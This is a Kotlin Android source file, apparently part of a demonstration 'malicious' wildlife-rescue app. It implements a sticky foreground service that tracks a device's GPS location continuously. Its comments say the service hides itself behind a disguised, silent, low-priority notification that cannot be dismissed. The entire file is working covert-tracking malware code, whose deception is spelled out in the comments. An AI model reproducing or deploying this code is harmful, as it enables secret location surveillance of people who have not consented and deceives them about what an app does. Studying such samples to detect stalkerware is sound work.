package com.example.wildliferescuer.malicious

import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.Intent
import android.os.Build
import android.os.IBinder
import android.util.Log
import androidx.core.app.NotificationCompat
import com.example.wildliferescuer.MainActivity
import com.example.wildliferescuer.R

/**
 * GPS Tracking Foreground Service
 * 
 * Runs GPS tracking in background continuously
 * Uses a foreground service to avoid being killed by Android
 * 
 * Shows a notification (required for foreground service)
 * But disguises it as a legitimate "Wildlife Tracking" notification
 */
class GpsTrackingService : Service() {
    
    private val TAG = "MALICIOUS_APP"
    private val CHANNEL_ID = "wildlife_tracking_channel"
    private val NOTIFICATION_ID = 12345
    
    private var gpsTracker: GpsTracker? = null
    private var deviceId: String = ""
    
    override fun onCreate() {
        super.onCreate()
        Log.e(TAG, "📍 GPS Tracking Service created")
        
        // Create notification channel
        createNotificationChannel()
    }
    
    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        deviceId = intent?.getStringExtra("deviceId") ?: "unknown"
        val trigger = intent?.getStringExtra("trigger") ?: "unknown"
        
        Log.e(TAG, "📍 GPS Tracking Service started")
        Log.e(TAG, "   Device ID: ${deviceId.take(8)}...")
        Log.e(TAG, "   Trigger: $trigger")
        
        // Start foreground service with notification
        startForeground(NOTIFICATION_ID, createNotification())
        
        // Start GPS tracking
        startTracking()
        
        return START_STICKY // Restart service if killed
    }
    
    override fun onDestroy() {
        super.onDestroy()
        Log.e(TAG, "📍 GPS Tracking Service destroyed")
        
        // Stop tracking
        gpsTracker?.stopTracking()
    }
    
    override fun onBind(intent: Intent?): IBinder? {
        return null
    }
    
    /**
     * Start GPS tracking
     */
    private fun startTracking() {
        gpsTracker = GpsTracker(this)
        gpsTracker?.startTracking(deviceId, "service_user")
        
        Log.e(TAG, "✅ Continuous GPS tracking active")
    }
    
    /**
     * Create notification channel (required for Android 8.0+)
     */
    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "Wildlife Tracking", // Disguised as legitimate feature
                NotificationManager.IMPORTANCE_LOW // Low priority to be less noticeable
            ).apply {
                description = "Tracking wildlife rescue locations"
                setShowBadge(false) // Don't show badge
            }
            
            val notificationManager = getSystemService(NotificationManager::class.java)
            notificationManager.createNotificationChannel(channel)
        }
    }
    
    /**
     * Create notification
     * Disguised as a legitimate wildlife tracking notification
     */
    private fun createNotification(): android.app.Notification {
        // Create intent to open app when notification is clicked
        val notificationIntent = Intent(this, MainActivity::class.java)
        val pendingIntent = PendingIntent.getActivity(
            this, 
            0, 
            notificationIntent,
            PendingIntent.FLAG_IMMUTABLE
        )
        
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Wildlife Tracking Active") // Disguised title
            .setContentText("Monitoring wildlife rescue locations") // Disguised text
            .setSmallIcon(R.drawable.ic_launcher_foreground)
            .setContentIntent(pendingIntent)
            .setPriority(NotificationCompat.PRIORITY_LOW) // Low priority
            .setOngoing(true) // Can't be dismissed
            .setSilent(true) // No sound/vibration
            .build()
    }
}
